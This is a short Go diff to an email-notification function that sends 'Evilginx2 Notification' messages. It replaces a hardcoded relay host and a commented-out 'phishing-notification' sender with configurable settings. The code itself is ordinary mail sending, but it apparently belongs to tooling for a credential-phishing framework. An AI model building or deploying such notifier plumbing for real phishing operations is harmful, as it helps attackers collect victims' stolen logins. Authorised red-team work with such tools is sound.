@@ -75,11 +75,8 @@ func NotifierSend(n *Notify, body interface{}) error {
 		bodymarshaldjson, _ := json.Marshal(body)
 		bodystr := string(bodymarshaldjson)
 
-		//from := "phishing-notification@" + hostname
-
-		// TODO create vairables for all of this?
 		m := gomail.NewMessage()
-		m.SetHeader("From", from)
+		m.SetHeader("From", n.FromAddress)
 		m.SetHeader("To", n.Url)
 		m.SetHeader("Subject", "Evilginx2 Notification")
 		m.SetBody("text/plain", bodystr)
@@ -89,9 +86,9 @@ func NotifierSend(n *Notify, body interface{}) error {
 			m.SetHeader(n.AuthHeaderName, n.AuthHeaderValue)
 		}
 
-		d := gomail.Dialer{Host: "relay", Port: 587}
+		d := gomail.Dialer{Host: n.SMTPserver, Port: 587}
 		if n.BasicAuthUser != "" && n.BasicAuthPassword != "" {
-			d = gomail.Dialer{Host: "relay", Port: 587, Username: n.BasicAuthUser, Password: n.BasicAuthPassword}
+			d = gomail.Dialer{Host: n.SMTPserver, Port: 587, Username: n.BasicAuthUser, Password: n.BasicAuthPassword}
 		}
 		log.Debug("Mail Notification sent to " + n.Url)
 
